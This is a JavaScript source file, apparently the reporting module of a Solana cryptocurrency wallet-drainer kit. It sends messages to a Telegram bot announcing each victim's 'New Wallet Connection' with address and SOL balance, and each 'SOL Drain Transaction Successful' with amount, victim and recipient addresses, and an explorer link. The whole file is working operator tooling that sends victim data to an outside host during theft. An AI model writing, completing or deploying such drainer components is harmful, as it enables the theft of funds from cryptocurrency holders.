import axios from 'axios';

export class TelegramService {
  constructor() {
    this.botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
    this.chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
    
    if (!this.botToken || !this.chatId) {
      console.error('Telegram credentials missing');
    }
  }

  async sendMessage(message) {
    try {
      if (!this.botToken || !this.chatId) {
        console.error('Cannot send Telegram message: Missing credentials');
        return false;
      }

      const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;

      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: this.chatId,
          text: message,
          parse_mode: 'HTML'
        }),
      });

      if (!response.ok) {
        console.error('Telegram API error');
        return false;
      }

      return true;
    } catch (error) {
      console.error('Error sending Telegram message');
      return false;
    }
  }

  formatWalletInfo(info) {
    return `<b>🔐 New Wallet Connection</b>\n\n` +
           `<b>👤 Wallet Address:</b>\n` +
           `<code>${info.publicKey}</code>\n\n` +
           `<b>💰 Balance:</b>\n` +
           `<code>${info.balance.toFixed(2)} SOL</code>\n\n` +
           `<b>⏰ Connection Time:</b>\n` +
           `<code>${new Date(info.timestamp).toLocaleString()}</code>\n\n` +
           `<i>Wallet connection successful</i>`;
  }

  formatTransactionInfo(info) {
    const solanaExplorerLink = `https://solscan.io/tx/${info.signature}`;
    const formattedTime = new Date(info.timestamp).toLocaleString();
    const formattedAmount = parseFloat(info.amount).toFixed(2);

    return `<b>💸 SOL Drain Transaction Successful</b>\n\n` +
           `<b>💰 Amount:</b>\n` +
           `<code>${formattedAmount} SOL</code>\n\n` +
           `<b>👤 From:</b>\n` +
           `<code>${info.from}</code>\n\n` +
           `<b>📥 To:</b>\n` +
           `<code>${info.to}</code>\n\n` +
           `<b>⏰ Time:</b>\n` +
           `<code>${formattedTime}</code>\n\n` +
           `<b>🔗 Transaction:</b>\n` +
           `<a href="${solanaExplorerLink}">View on Solscan</a>\n\n` +
           `<i>Transaction completed successfully</i>`;
  }
} 